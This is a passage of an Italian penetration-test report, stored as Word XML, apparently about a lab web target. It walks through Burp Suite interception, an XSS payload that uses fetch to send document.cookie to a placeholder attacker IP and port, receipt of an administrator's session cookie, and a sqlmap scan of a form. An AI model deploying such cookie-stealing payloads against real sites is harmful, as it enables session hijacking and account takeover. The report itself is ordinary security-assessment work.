      </w:r>
      <w:r w:rsidR="675B1500">
        <w:rPr/>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="675B1500" w:rsidP="21040C4D" w:rsidRDefault="675B1500" w14:paraId="0820D793" w14:textId="20B58B16">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="675B1500">
        <w:rPr/>
        <w:t>Il sito inoltre non espone API sfruttabili.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6E771FDD" w:rsidP="21040C4D" w:rsidRDefault="6E771FDD" w14:paraId="7C0D8DAB" w14:textId="472BEFBC">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="6E771FDD">
        <w:drawing>
          <wp:inline wp14:editId="764AA713" wp14:anchorId="08687C54">
            <wp:extent cx="5267324" cy="2314575"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2426656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a486663e7f46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771FDD">
        <w:rPr/>
        <w:t>Homepage del sito</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6E771FDD" w:rsidP="21040C4D" w:rsidRDefault="6E771FDD" w14:paraId="16AE19B3" w14:textId="309A6DC2">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="6E771FDD">
        <w:rPr/>
        <w:t xml:space="preserve">A questo punto con </w:t>
      </w:r>
      <w:r w:rsidR="00252088">
        <w:rPr/>
        <w:t xml:space="preserve">i risultati ottenuti del </w:t>
      </w:r>
      <w:r w:rsidR="00252088">
        <w:rPr/>
        <w:t>fuzzing</w:t>
      </w:r>
      <w:r w:rsidR="00252088">
        <w:rPr/>
        <w:t xml:space="preserve"> precedente andiamo a visualizzare le pagine in cerca di campi di input.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00252088" w:rsidP="21040C4D" w:rsidRDefault="00252088" w14:paraId="3815A849" w14:textId="3E6EE022">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="00252088">
        <w:rPr/>
        <w:t xml:space="preserve">I campi di input sono in genere luogo di numerosi attacchi alle Web App in quanto se non opportunamente sanificati possono portare ad attacchi come </w:t>
      </w:r>
      <w:r w:rsidR="36FC9BE0">
        <w:rPr/>
        <w:t>XSS e</w:t>
      </w:r>
      <w:r w:rsidR="00252088">
        <w:rPr/>
        <w:t xml:space="preserve"> SQL</w:t>
      </w:r>
      <w:r w:rsidR="65E84CB6">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="65E84CB6">
        <w:rPr/>
        <w:t>Injction</w:t>
      </w:r>
      <w:r w:rsidR="65E84CB6">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="46307978" w:rsidP="21040C4D" w:rsidRDefault="46307978" w14:paraId="25B03549" w14:textId="69A8D7E6">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="46307978">
        <w:drawing>
          <wp:inline wp14:editId="21FEA427" wp14:anchorId="0E5A0C0F">
            <wp:extent cx="5267324" cy="2333625"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1531919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44992fbeae4c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307978">
        <w:rPr/>
        <w:t>Schermata di login</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="157B0394" w:rsidP="21040C4D" w:rsidRDefault="157B0394" w14:paraId="761DE018" w14:textId="5EE903B7">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="157B0394">
        <w:drawing>
          <wp:inline wp14:editId="4937209E" wp14:anchorId="6B8425D5">
            <wp:extent cx="5267324" cy="2324100"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="5977949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88a9bfdf8c41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57B0394">
        <w:rPr/>
        <w:t>Pagina quote</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="157B0394" w:rsidP="21040C4D" w:rsidRDefault="157B0394" w14:paraId="78717B31" w14:textId="3BDE99EC">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="157B0394">
        <w:rPr/>
        <w:t xml:space="preserve">In queste pagine vediamo che è possibile inserire dei campi di </w:t>
      </w:r>
      <w:r w:rsidR="157B0394">
        <w:rPr/>
        <w:t>testo</w:t>
      </w:r>
      <w:r w:rsidR="6A6C3AB2">
        <w:rPr/>
        <w:t>, quindi</w:t>
      </w:r>
      <w:r w:rsidR="6A6C3AB2">
        <w:rPr/>
        <w:t xml:space="preserve"> saranno prontamente analizzate in seguito.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="27ACBE66" w:rsidP="21040C4D" w:rsidRDefault="27ACBE66" w14:paraId="2B30DDF1" w14:textId="146CE36F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="27ACBE66">
        <w:rPr/>
        <w:t xml:space="preserve">Andiamo ora a verificare la vulnerabilità rispetto ad attacchi di tipo XSS e lo faremo con </w:t>
      </w:r>
      <w:r w:rsidR="27ACBE66">
        <w:rPr/>
        <w:t>Burp</w:t>
      </w:r>
      <w:r w:rsidR="27ACBE66">
        <w:rPr/>
        <w:t xml:space="preserve"> Suite.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="280583DA" w:rsidP="21040C4D" w:rsidRDefault="280583DA" w14:paraId="39F348FE" w14:textId="2AA7D848">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="280583DA">
        <w:drawing>
          <wp:inline wp14:editId="294F9E4C" wp14:anchorId="4A27F87E">
            <wp:extent cx="5267324" cy="2562225"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="9017458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14b4be089d42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80583DA">
        <w:rPr/>
        <w:t>Impostazione del proxy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="280583DA" w:rsidP="21040C4D" w:rsidRDefault="280583DA" w14:paraId="00605B06" w14:textId="0C9A9C16">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="280583DA">
        <w:drawing>
          <wp:inline wp14:editId="1F197F3B" wp14:anchorId="3ACB8766">
            <wp:extent cx="5267324" cy="3733800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14900602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fb85c2960947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80583DA">
        <w:rPr/>
        <w:t xml:space="preserve">Apertura </w:t>
      </w:r>
      <w:r w:rsidR="280583DA">
        <w:rPr/>
        <w:t>Burp</w:t>
      </w:r>
      <w:r w:rsidR="280583DA">
        <w:rPr/>
        <w:t xml:space="preserve"> Suite Community Edition</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="280583DA" w:rsidP="21040C4D" w:rsidRDefault="280583DA" w14:paraId="60D05188" w14:textId="52AE096D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="280583DA">
        <w:rPr/>
        <w:t>Una volta aperto lo andiamo a configurare con i parametri standard.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="280583DA" w:rsidP="21040C4D" w:rsidRDefault="280583DA" w14:paraId="25B915FB" w14:textId="4DD1407B">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="280583DA">
        <w:drawing>
          <wp:inline wp14:editId="75450A67" wp14:anchorId="6A363486">
            <wp:extent cx="5267324" cy="3733800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="15887147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f0b3a1ac7344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80583DA">
        <w:rPr/>
        <w:t>Impostazioni di default</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="280583DA" w:rsidP="21040C4D" w:rsidRDefault="280583DA" w14:paraId="5CEF2AE0" w14:textId="7C4D17AC">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="280583DA">
        <w:rPr/>
        <w:t xml:space="preserve">Una volta configurato, lo possiamo </w:t>
      </w:r>
      <w:r w:rsidR="46287DC7">
        <w:rPr/>
        <w:t xml:space="preserve">avviare </w:t>
      </w:r>
      <w:r w:rsidR="280583DA">
        <w:rPr/>
        <w:t xml:space="preserve">e lo mettiamo </w:t>
      </w:r>
      <w:r w:rsidR="74102E90">
        <w:rPr/>
        <w:t>in ascolto sulla porta 8080 come configurati nel proxy del browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="542B7708" w:rsidP="21040C4D" w:rsidRDefault="542B7708" w14:paraId="18C11C64" w14:textId="1347BECC">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="542B7708">
        <w:drawing>
          <wp:inline wp14:editId="5D2AC0A0" wp14:anchorId="4E3527B7">
            <wp:extent cx="5267324" cy="3771900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="255455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bfe7ba5ad343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2B7708">
        <w:rPr/>
        <w:t>Schermata Proxy</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="64D2293E" w:rsidP="21040C4D" w:rsidRDefault="64D2293E" w14:paraId="08F3B3C2" w14:textId="1467639E">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="64D2293E">
        <w:rPr/>
        <w:t xml:space="preserve">Proviamo ora ad inviare qualcosa nel </w:t>
      </w:r>
      <w:r w:rsidR="64D2293E">
        <w:rPr/>
        <w:t>form</w:t>
      </w:r>
      <w:r w:rsidR="64D2293E">
        <w:rPr/>
        <w:t xml:space="preserve"> affinché lo possiamo modificare.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="64D2293E" w:rsidP="21040C4D" w:rsidRDefault="64D2293E" w14:paraId="2552526E" w14:textId="0FCFA60A">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="64D2293E">
        <w:drawing>
          <wp:inline wp14:editId="01699167" wp14:anchorId="4DB54CC4">
            <wp:extent cx="5267324" cy="2190750"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="14273334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8edda760794f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D2293E">
        <w:rPr/>
        <w:t xml:space="preserve">Prova di invio del </w:t>
      </w:r>
      <w:r w:rsidR="64D2293E">
        <w:rPr/>
        <w:t>form</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="62D1C5D2" w:rsidP="21040C4D" w:rsidRDefault="62D1C5D2" w14:paraId="029E2600" w14:textId="7F88D53D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="62D1C5D2">
        <w:drawing>
          <wp:inline wp14:editId="0C3B3EB9" wp14:anchorId="349A0845">
            <wp:extent cx="5267324" cy="2200275"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="399592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93ee93dcba43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D1C5D2" w:rsidP="21040C4D" w:rsidRDefault="62D1C5D2" w14:paraId="5F978B6D" w14:textId="71088B31">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="62D1C5D2">
        <w:rPr/>
        <w:t xml:space="preserve">L’asset ha richiesto che nel campo e-mail ci fosse una e-mail, quindi ne </w:t>
      </w:r>
      <w:r w:rsidR="62D1C5D2">
        <w:rPr/>
        <w:t>insieriamo</w:t>
      </w:r>
      <w:r w:rsidR="62D1C5D2">
        <w:rPr/>
        <w:t xml:space="preserve"> una arbitraria.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7C9BBB11" w:rsidP="21040C4D" w:rsidRDefault="7C9BBB11" w14:paraId="749F26A0" w14:textId="45635840">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7C9BBB11">
        <w:drawing>
          <wp:inline wp14:editId="3AB551F2" wp14:anchorId="16303AFB">
            <wp:extent cx="5267324" cy="3790950"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1388438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ced9d2524448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9BBB11" w:rsidP="21040C4D" w:rsidRDefault="7C9BBB11" w14:paraId="2CB69763" w14:textId="44A52490">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t xml:space="preserve">A questo punto la nostra richiesta sarà prontamente intercettata la proxy, ora </w:t>
      </w:r>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t>pr</w:t>
      </w:r>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t>oviamo ad iniettare del XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7C9BBB11" w:rsidP="21040C4D" w:rsidRDefault="7C9BBB11" w14:paraId="7B356183" w14:textId="3AFAFB17">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t xml:space="preserve">In particolare, apriamo una porta in ascolto su cui ci faremo inviare i cookie di sessione di un utente autorizzato a visualizzare le </w:t>
      </w:r>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t>quotes</w:t>
      </w:r>
      <w:r w:rsidR="7C9BBB11">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="60AD4D7F" w14:textId="1A1F642B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="6D54782F" w:rsidP="21040C4D" w:rsidRDefault="6D54782F" w14:paraId="3C648E5E" w14:textId="0ECF68A9">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6D54782F">
        <w:rPr/>
        <w:t xml:space="preserve">A questo punto sarà necessario conoscere il nostro IP per far </w:t>
      </w:r>
      <w:r w:rsidR="6D54782F">
        <w:rPr/>
        <w:t>inviare</w:t>
      </w:r>
      <w:r w:rsidR="6D54782F">
        <w:rPr/>
        <w:t xml:space="preserve"> i cookie al nostro </w:t>
      </w:r>
      <w:r w:rsidR="6D54782F">
        <w:rPr/>
        <w:t>host</w:t>
      </w:r>
      <w:r w:rsidR="6D54782F">
        <w:rPr/>
        <w:t xml:space="preserve"> e alla nostra porta in ascolto.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6D54782F" w:rsidP="21040C4D" w:rsidRDefault="6D54782F" w14:paraId="0F288EE3" w14:textId="2B9DA3C0">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="6D54782F">
        <w:drawing>
          <wp:inline wp14:editId="067B4E5E" wp14:anchorId="043E9A23">
            <wp:extent cx="5267324" cy="2486025"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="872879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f42eca706d41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9C4FA" w:rsidP="21040C4D" w:rsidRDefault="3A89C4FA" w14:paraId="439A29FA" w14:textId="58334503">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="3A89C4FA">
        <w:rPr/>
        <w:t xml:space="preserve">Il seguente </w:t>
      </w:r>
      <w:r w:rsidR="40F05B5E">
        <w:rPr/>
        <w:t>codice sarà usato per effettuare il test:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>img</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>src</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t xml:space="preserve">=x </w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>onerror</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>fetc</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>(“http://&lt;ip&gt;:&lt;porta&gt;</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>/”+</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>document.cookie</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="4150EAEE">
        <w:rPr/>
        <w:t>;</w:t>
      </w:r>
      <w:r w:rsidR="236EFC9C">
        <w:rPr/>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="62C38CB8" w:rsidP="21040C4D" w:rsidRDefault="62C38CB8" w14:paraId="600C4036" w14:textId="073D3831">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="62C38CB8">
        <w:drawing>
          <wp:inline wp14:editId="563D7D1C" wp14:anchorId="66B53831">
            <wp:extent cx="5267324" cy="3771900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1179249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b16cc3472743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38CB8" w:rsidP="21040C4D" w:rsidRDefault="62C38CB8" w14:paraId="4F452027" w14:textId="563E64BB">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="62C38CB8">
        <w:rPr/>
        <w:t>Naturalmente ora questo campo non va bene in quanto dovremmo prima effettuare l’</w:t>
      </w:r>
      <w:r w:rsidR="62C38CB8">
        <w:rPr/>
        <w:t>encoding</w:t>
      </w:r>
      <w:r w:rsidR="62C38CB8">
        <w:rPr/>
        <w:t xml:space="preserve"> di tale stringa.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="155847B1" w:rsidP="21040C4D" w:rsidRDefault="155847B1" w14:paraId="2327EA7E" w14:textId="347FB565">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="155847B1">
        <w:drawing>
          <wp:inline wp14:editId="57554452" wp14:anchorId="7181CEBB">
            <wp:extent cx="5267324" cy="3771900"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="375558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7ea4f16a8c4f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5847B1" w:rsidP="21040C4D" w:rsidRDefault="155847B1" w14:paraId="5A0210B2" w14:textId="44AD8766">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="155847B1">
        <w:rPr/>
        <w:t>Ora che l’input è correttamente formattato possiamo procedere a metterci in ascolto sulla porta che abbiamo scelto (in questo caso 8081) ed aspettare i cookie di sessione.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="546AE61F" w:rsidP="21040C4D" w:rsidRDefault="546AE61F" w14:paraId="4D73B20F" w14:textId="4E8C74D7">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="546AE61F">
        <w:drawing>
          <wp:inline wp14:editId="6EDC620D" wp14:anchorId="03F01DC8">
            <wp:extent cx="4228572" cy="1961905"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20333757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9bc793d5bf44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572" cy="1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4D5C94" w:rsidP="21040C4D" w:rsidRDefault="424D5C94" w14:paraId="07F7BC46" w14:textId="5FED9F78">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="424D5C94">
        <w:rPr/>
        <w:t>A questo punto dopo qualche secondo riceveremo il pacchetto contenente i cookie di sessione di uno degli amministratori.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="424D5C94" w:rsidP="21040C4D" w:rsidRDefault="424D5C94" w14:paraId="13616E37" w14:textId="52D0B7EB">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="424D5C94">
        <w:drawing>
          <wp:inline wp14:editId="642BE90F" wp14:anchorId="0BA9DE3A">
            <wp:extent cx="5267324" cy="1390650"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="20213727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a7b34b5aef41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4D5C94" w:rsidP="21040C4D" w:rsidRDefault="424D5C94" w14:paraId="53328E96" w14:textId="5AADC31B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="424D5C94">
        <w:rPr/>
        <w:t>A questo punto è più che evidente che quel campo di input è vulnerabile a XSS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="53BBC591" w14:textId="76CB89EF">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="6ADD6C3E" w:rsidP="21040C4D" w:rsidRDefault="6ADD6C3E" w14:paraId="48579FDE" w14:textId="5DE08E65">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1754730583" w:id="604716568"/>
      <w:r w:rsidR="6ADD6C3E">
        <w:rPr/>
        <w:t xml:space="preserve">Database </w:t>
      </w:r>
      <w:r w:rsidR="6ADD6C3E">
        <w:rPr/>
        <w:t>Assessment</w:t>
      </w:r>
      <w:bookmarkEnd w:id="604716568"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="2DCA9334" w14:textId="2603F080">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="048EF4D7" w:rsidP="21040C4D" w:rsidRDefault="048EF4D7" w14:paraId="31E91E94" w14:textId="351AA860">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t>Dopo aver individuato l’</w:t>
      </w:r>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t>ulitima</w:t>
      </w:r>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t xml:space="preserve"> pagina ci chiediamo se è possibile effettuare attacchi di tipo </w:t>
      </w:r>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t>SQLInjection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="048EF4D7" w:rsidP="21040C4D" w:rsidRDefault="048EF4D7" w14:paraId="549940A5" w14:textId="72B851AD">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t xml:space="preserve">Per verificarlo usiamo il comando </w:t>
      </w:r>
      <w:r w:rsidR="048EF4D7">
        <w:rPr/>
        <w:t>sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="6FC7BE8D" w:rsidP="21040C4D" w:rsidRDefault="6FC7BE8D" w14:paraId="575000D0" w14:textId="709F24C5">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="6FC7BE8D">
        <w:rPr/>
        <w:t>Rilevare una vulnerabilità di questo sito potrebbe tramutarsi in un grave rischio per gli utenti in quanto potrebbe esporre ad utenti non autorizzati informazioni sensibili e dati di acce</w:t>
      </w:r>
      <w:r w:rsidR="3F8D52E2">
        <w:rPr/>
        <w:t>sso.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7B53694E" w:rsidP="21040C4D" w:rsidRDefault="7B53694E" w14:paraId="355E02DF" w14:textId="5EBDC52F">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1270106638" w:id="2044100140"/>
      <w:r w:rsidR="7B53694E">
        <w:rPr/>
        <w:t>Sqlmap</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2044100140"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="09C4C1A4" w14:textId="7F3144A2">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0A3350B1" w:rsidP="21040C4D" w:rsidRDefault="0A3350B1" w14:paraId="2CF8ADEC" w14:textId="0F449B89">
      <w:pPr>
        <w:pStyle w:val="Didascalia"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="0A3350B1">
        <w:drawing>
          <wp:inline wp14:editId="28C77767" wp14:anchorId="6808D712">
            <wp:extent cx="5267324" cy="4067175"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="13744590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6c28babf0546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A3350B1">
        <w:drawing>
          <wp:inline wp14:editId="6FE58BF8" wp14:anchorId="2D4B9471">
            <wp:extent cx="5267324" cy="2724150"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1007603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a3c22488e849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A3350B1">
        <w:rPr/>
        <w:t xml:space="preserve">Risulato </w:t>
      </w:r>
      <w:r w:rsidR="0A3350B1">
        <w:rPr/>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidR="0A3350B1">
        <w:rPr/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0A3350B1">
        <w:rPr/>
        <w:t>sqlmap.py ”http</w:t>
      </w:r>
      <w:r w:rsidR="0A3350B1">
        <w:rPr/>
        <w:t>:10.10.11.12</w:t>
      </w:r>
      <w:r w:rsidR="1A0586A7">
        <w:rPr/>
        <w:t>:80/</w:t>
      </w:r>
      <w:r w:rsidR="1A0586A7">
        <w:rPr/>
        <w:t>quotes</w:t>
      </w:r>
      <w:r w:rsidR="0A3350B1">
        <w:rPr/>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="01D43476">
        <w:rPr/>
        <w:t xml:space="preserve"> --batch –</w:t>
      </w:r>
      <w:r w:rsidR="01D43476">
        <w:rPr/>
        <w:t>forms</w:t>
      </w:r>
      <w:r w:rsidR="01D43476">
        <w:rPr/>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="01D43476">
        <w:rPr/>
        <w:t>dbs</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="01D43476" w:rsidP="21040C4D" w:rsidRDefault="01D43476" w14:paraId="3AED8AF8" w14:textId="119230A1">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="01D43476">
        <w:rPr/>
        <w:t xml:space="preserve">Da questo risultato parziale si evince che </w:t>
      </w:r>
      <w:r w:rsidR="65E07A57">
        <w:rPr/>
        <w:t xml:space="preserve">il campo </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>e-mail</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> non è soggetto ad attacchi di tipo </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>SQLInjection</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> e per questo bisognerà valutare la sua resistenza ad attacchi </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>XSS</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="65E07A57">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="5AC5044E" w:rsidP="21040C4D" w:rsidRDefault="5AC5044E" w14:paraId="56BE550B" w14:textId="29A44FCE">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc312417858" w:id="277490680"/>
      <w:r w:rsidR="5AC5044E">
        <w:rPr/>
        <w:t>Target Exploitation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="277490680"/>
